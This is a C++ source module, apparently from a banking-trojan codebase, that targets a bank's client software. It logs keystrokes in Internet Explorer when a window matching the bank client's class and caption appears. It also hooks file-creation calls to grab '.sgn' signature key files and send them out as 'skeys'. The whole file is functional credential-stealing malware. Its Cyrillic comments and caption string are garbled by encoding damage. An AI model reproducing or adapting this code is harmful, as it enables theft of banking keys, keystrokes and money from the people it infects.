//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifndef RafaH
	#error Exclude module from project
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if



//****************************************************************************
#include <Windows.h>

#include "GetApi.h"
#include "KeyLogSystems.h"
#include "Memory.h"
#include "Utils.h"
#include "Splice.h"
#include "rafa.h"
#include "Config.h"
#include "FileGrabber.h"

#include "RafaDll.cpp"

#include "BotDebug.h"

namespace DBGRAFAKEY
{
	#include "DbgTemplates.h"
}

#define DBG DBGRAFAKEY::DBGOutMessage<>

namespace Rafa {

	//�������� ��������� ����� ����� � �������, ���� �������� ����� � ����������� sgn, ������� �����������
	//������ ����� ����������� ����� ������
	//���������� ��������� ��� ���������� ����� � ������� ��������� ��� ����, � ����� ��������� ���� �������
	int FileKeyEvent( FileGrabber::ParamEvent* e )
	{
		DBG( "Rafa", "Key file: '%s'", e->fileName );
		m_lstrcpy( e->nameSend, "skeys" );
		return FileGrabber::SENDFOLDER | FileGrabber::STOPRECEIVER;
	}
/*
	void AddFiles(PFindData Search, PCHAR FileName, LPVOID Data, bool &Cancel) {
		// ��������� ���������� � ����� ���������
		KeyLogger::AddDirectory(FileName, Search->cFileName);

		Cancel = true;
		*(bool*)Data = true;
	}

	void SearchRafaFiles(PCHAR Drive, LPVOID Data, bool &Cancel) {
		char D = *Drive;
		if (D == 'a' || D == 'A' || D == 'b' || D == 'B')
			return;

		bool C = false;
		SearchFiles(Drive, "skeys*", false, FA_DIRECTORY, &C, AddFiles);
		Cancel = C;
	}
*/

//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifndef INT_MAX
	#define INT_MAX       2147483647
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if


	void CopyRafaKeyFiles(LPVOID Sender)
	{
		DBG( "Rafa", "������������" );

//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef RafaDllModule
		InitHook_FilialRConDll();
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
		// ������� ���������� ������������� ������� rafa
		// ��������� � ����� ��������� ����� ������
//		EnumDrives(DRIVE_REMOVABLE, SearchRafaFiles, NULL);

		FileGrabber::Init(FileGrabber::CREATEFILEA | FileGrabber::CREATEFILEW );
		FileGrabber::Receiver* rv = FileGrabber::CreateReceiver();
		rv->FuncReceiver = FileKeyEvent;
		const DWORD neededExt[] = { 0x1CF3EE /* sgn */, 0 };
		FileGrabber::AddNeededExt( rv, neededExt );
		rv->minSize = INT_MAX; //������������ ����� ������ ����� ����� ��� �� ����������
		FileGrabber::AddReceiver(rv);
	}

	void Init()
	{
		PKeyLogSystem S;
		S = KeyLogger::AddSystem("raif", PROCESS_HASH_IE);
		if (S != NULL)
		{
			char RafaCaption[] = {
				'�', '�', '�', '�', '�', '�', '�', ' ', '�', '�', '�', '�', '�', '�', 0 };

			char RafaClass[] = {'V','C','o','n','t','r','o','l','*', 0};

			S->OnActivate   = Rafa::CopyRafaKeyFiles;
			PKlgWndFilter F = KeyLogger::AddFilter(S, true, true, RafaClass, (PCHAR)RafaCaption, FILTRATE_PARENT_WND, LOG_ALL, 3);
		}
	}
}


//=============================================================================
////REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if  //RafaH



